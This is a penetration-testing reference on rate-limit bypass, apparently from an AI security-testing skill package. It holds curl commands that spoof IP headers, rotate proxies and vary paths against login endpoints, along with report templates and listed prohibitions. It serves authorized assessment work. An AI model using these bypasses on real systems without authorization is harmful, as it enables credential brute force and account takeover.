# Rate Limiting Bypass Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify rate limiting vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual brute force attacks are prohibited
> - Rate limit payloads are for understanding attack surface only, **no credential brute force**
> - Validation proves vulnerability existence (limit bypassable), **no mass enumeration executed**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Test authentication endpoints, API limits, and account actions**

---

## Validation Objectives (Within Security Boundary)

Rate limiting vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Limit Presence Check | ✓ Verify rate limit exists | - | Execute brute force |
| Limit Detection | ✓ Identify limit threshold | - | Reach limit with real attempts |
| Bypass Technique Test | ✓ Test bypass methods | ✓ Brief controlled test | Mass brute force |
| Timing Analysis | ✓ Analyze limit reset time | - | Continuous attacks |

**Safe Validation Method**: Test if rate limit exists and can be bypassed with small sample requests; do not execute large-scale brute force or credential stuffing.

---

## Rate Limit Detection

### Identify Rate Limited Endpoints

```text
Common rate limited endpoints:
- /login (authentication brute force)
- /api/auth (API authentication)
- /reset-password (reset request limit)
- /api/v1/* (API request limits)
- /register (account creation)
- /otp/verify (OTP brute force)
- /api/payments (transaction limits)
```

### Basic Detection Method

```bash
# Send requests rapidly, observe response change
for i in {1..10}; do
  curl -X POST https://target.com/login \
    -d "username=test&password=wrong$i" \
    -H "Content-Type: application/x-www-form-urlencoded"
done

# Observe:
# - Response changes after N requests?
# - HTTP 429 Too Many Requests?
# - Response time increases?
# - Error message indicates limit?
```

### Rate Limit Response Patterns

| HTTP Status | Meaning |
|-------------|---------|
| 429 | Too Many Requests - rate limit hit |
| 403 | Forbidden - possibly rate limited |
| 200 + error message | Soft limit with message |
| 503 | Service Unavailable - possibly rate limit |
| Slow response | Throttling applied |

---

## Rate Limit Bypass Techniques

### 1. IP Rotation (via Proxy/VPN)

```bash
# Rate limit often based on source IP
# Test with different source
curl -x proxy1:8080 https://target.com/login
curl -x proxy2:8080 https://target.com/login
```

**Boundary**: Use controlled proxy for testing only; do not use botnets or mass IP rotation.

### 2. X-Forwarded-For Header

```bash
# Backend may trust X-Forwarded-For as client IP
curl -X POST https://target.com/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d "username=test&password=wrong"

# Rotate X-Forwarded-For
for i in {1..10}; do
  curl -X POST https://target.com/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "username=test&password=wrong$i"
done

# If each request accepted -> rate limit bypassed via header
```

### 3. X-Real-IP Header

```bash
curl -X POST https://target.com/login \
  -H "X-Real-IP: 1.2.3.4" \
  -d "username=test&password=wrong"
```

### 4. Client-IP Header

```bash
curl -X POST https://target.com/login \
  -H "Client-IP: 1.2.3.4" \
  -d "username=test&password=wrong"
```

### 5. Multiple IP Headers

```bash
curl -X POST https://target.com/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -H "X-Forwarded-For: 5.6.7.8" \
  -H "X-Real-IP: 9.10.11.12" \
  -d "username=test&password=wrong"
```

### 6. HTTP Headers Variation

```bash
# Add unique headers to make requests appear different
curl -X POST https://target.com/login \
  -H "User-Agent: Custom-Agent-1" \
  -d "username=test&password=wrong"

curl -X POST https://target.com/login \
  -H "User-Agent: Custom-Agent-2" \
  -d "username=test&password=wrong"
```

### 7. URL Path Variation

```bash
# Rate limit may apply per path
curl -X POST https://target.com/login
curl -X POST https://target.com/login/
curl -X POST https://target.com/login?
curl -X POST https://target.com/login?a=1
curl -X POST https://target.com/login?a=2
```

### 8. Parameter Pollution

```bash
# Duplicate parameters
curl -X POST https://target.com/login \
  -d "username=test&password=wrong&username=test2"
```

### 9. Wait and Resume

```bash
# Detect limit reset time
# Wait N seconds, resume requests
# Test: limit reset after 60s? 300s? 3600s?
```

### 10. Distributed Testing

```bash
# Rate limit may be per endpoint, not per action
curl -X POST https://target.com/api/v1/login
curl -X POST https://target.com/api/v2/login
curl -X POST https://target.com/auth/login
```

---

## Rate Limit Granularity Analysis

### Per-IP vs Per-User

```bash
# Test same IP with different usernames
curl -X POST https://target.com/login -d "username=user1&password=wrong"
curl -X POST https://target.com/login -d "username=user2&password=wrong"
curl -X POST https://target.com/login -d "username=user3&password=wrong"

# If blocked after N attempts -> per-IP limit
# If each username allowed N attempts -> per-user limit
```

### Per-Account vs Per-IP

```bash
# Test different IPs with same username (via proxy)
curl -x proxy1 -X POST https://target.com/login -d "username=admin&password=wrong"
curl -x proxy2 -X POST https://target.com/login -d "username=admin&password=wrong"

# If account locked -> per-account limit (good)
# If each IP allowed -> per-IP only (bypassable)
```

---

## API Rate Limiting

### API Key vs User Rate Limit

```bash
# Test with different API keys (if available)
curl -H "X-API-Key: key1" https://target.com/api/data
curl -H "X-API-Key: key2" https://target.com/api/data

# Test without API key
curl https://target.com/api/data
```

### Endpoint-Specific Limits

```bash
# Different API endpoints may have different limits
curl https://target.com/api/v1/users
curl https://target.com/api/v1/products
curl https://target.com/api/v1/search
```

---

## Analysis Process

1. Identify rate-limited endpoints (login, API, reset)
2. Determine limit threshold by sending requests rapidly
3. Observe response when limit hit (429, error message, delay)
4. Test bypass techniques (X-Forwarded-For, headers, path)
5. Determine limit granularity (per-IP, per-user, per-endpoint)
6. **Stop validation**, document rate limit effectiveness and bypass potential
7. Do not execute brute force attacks

---

## Output

```markdown
## Vulnerability: Rate Limiting Bypass / Missing Rate Limit

### Location
{URL} - {endpoint}

### Limit Type
{IP-based / User-based / Endpoint-based / None}

### Limit Threshold
{N requests per X seconds / None detected}

### Bypass Methods Tested
| Method | Result |
|--------|--------|
| X-Forwarded-For | {Bypassed / Not bypassed} |
| X-Real-IP | {Bypassed / Not bypassed} |
| Path variation | {Bypassed / Not bypassed} |

### Risk Level
{see severity rules}

### Severity Classification

Rate limit missing itself is not high risk — **whether password can actually be brute-forced** is the harm. Default all rate limit missing/bypassable to **Low**, only upgrade to High when password actually brute-forced.

| Actual case | Severity | Note |
|---------|------|------|
| Rate limit missing or bypassable, but not brute-forced (default testing scope) | **Low** | Proof only brute-force "possible", not proven "succeeded". No large-scale brute-force within boundary |
| Explicit user authorization brute-force verification, and successfully brute-forced a password | **High** | Actually recovering a password is high risk |
| Rate limit missing but password policy strong (long/random passwords), brute-force infeasible | Low | Even without limit, practically unbreakable |
| OTP interface unlimited, but OTP has many digits/short validity | Low | Practically infeasible |
| Normal business interface (query/like) unlimited | Low/Info | No security impact |

**Boundary coordination**: This file Prohibited Operations prohibits large-scale real brute-force by default. Therefore under default testing, rate limit issues record Low. "Brute-forced a password = High" requires **explicit user authorization for brute-force verification** (Tier 2 authorized operation); verify success with test password within authorized scope before recording High, and document brute-force method and password used.
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Credential brute force | Do not attempt mass password guessing |
| ❌ Username enumeration | Do not enumerate all valid usernames |
| ❌ OTP brute force | Do not brute force OTP codes for real accounts |
| ❌ Mass account creation | Do not abuse registration limits |
| ❌ Distributed attacks | Do not use botnets or mass IP rotation |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `SKILL.md` -> Action Policy -> "Batch testing multiple targets | Ask first"